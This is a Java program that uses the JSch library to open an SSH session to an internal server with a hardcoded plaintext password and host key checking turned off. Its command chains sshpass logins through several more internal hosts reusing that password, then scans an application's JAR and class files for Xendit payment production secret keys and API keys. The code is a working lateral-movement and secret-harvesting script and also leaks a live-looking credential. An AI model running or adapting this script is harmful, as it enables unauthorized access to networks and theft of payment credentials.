import com.jcraft.jsch.*;
import java.io.*;
class DKXSE {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    // From NEO server, try SSH to Nucleus and also grep Xendit in NEO's own JAR files  
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"echo ---NUCLEUS-FROM-NEO---;sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 user@10.13.16.135 hostname 2>&1;echo ---STRINGS-NEO-JARS---;strings /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/neo-*.jar 2>/dev/null | grep -E \\\"xnd_production|xendit.secret|xendit.api.key|xendit.platform\\\" | head -10;echo ---STRINGS-CLASSES---;strings /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/classes/com/cpssoft/web/neo/xendit/*.class 2>/dev/null | grep -iE \\\"xnd_|secret|api.key|platform\\\" | head -10\" 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
